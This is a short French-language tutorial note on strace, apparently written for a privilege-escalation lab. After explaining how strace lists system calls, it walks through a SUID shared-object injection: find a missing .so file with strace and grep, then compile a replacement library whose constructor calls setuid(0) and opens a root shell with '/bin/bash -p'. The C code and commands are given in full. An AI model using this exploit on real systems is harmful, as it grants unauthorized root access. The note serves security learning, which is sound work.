Description :

Permet de diagnostiquer les appels systèmes. En gros à chaque fois que le programme appelle une librairie, l'ouverture de fichier,... il nous le montre. Ca peut être bordelique donc l'utilisation d'un grep est judicieuse.

Exemple :  
`strace /usr/local/bin/suid-so 2>&1`

Là on regarde tous les appels système. `2>&1` sert a rediriger les erreurs (2) vers la sortie standard (1). Le & sert juste a spécifier qu'on redirige vers un autre descripteur de fichier.

Vulnérabilité possible grâce a strace :

Si on a un fichier suid (fichier qui s'exécute avec les privilèges du owner du fichier donc s'il appartient à root, peu importe qui le lance, il se lancera en root) que tu peux voir avec la commande ls -l et voir si le bit s est actif, on pourra voir tout les appels système. Donc si on fait `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"` pour voir quelles sont les fichiers que le programme n'arrive pas à trouver, il nous les donnera. Grace à ca, on peut les créer nous même ces fichiers avec ce qu'on veut dedans.

Imaginons qu'il ne trouve pas un fichier .so nommé libcalc.so dans le dossier /home/user/.config, on peut créer le dossier .config (s'il n'existe pas encore) puis créer notre propre Shared Object à partir d'un script.

`gcc -shared -fPIC -o /home/user/.config/`[libcalc.so](http://libcalc.so "http://libcalc.so") `/home/user/tools/suid/libcalc.c` . Dans mon exemple, dans le fichier libcalc.c, il y a un mini script qui donne les privilèges root :

#include <stdio.h>  
#include <stdlib.h>

static void inject() **attribute**((constructor));

void inject() {  
        setuid(0);  
        system("/bin/bash -p");  
}  
Enfin, on relance le fichier suid pour voir si ca marche.
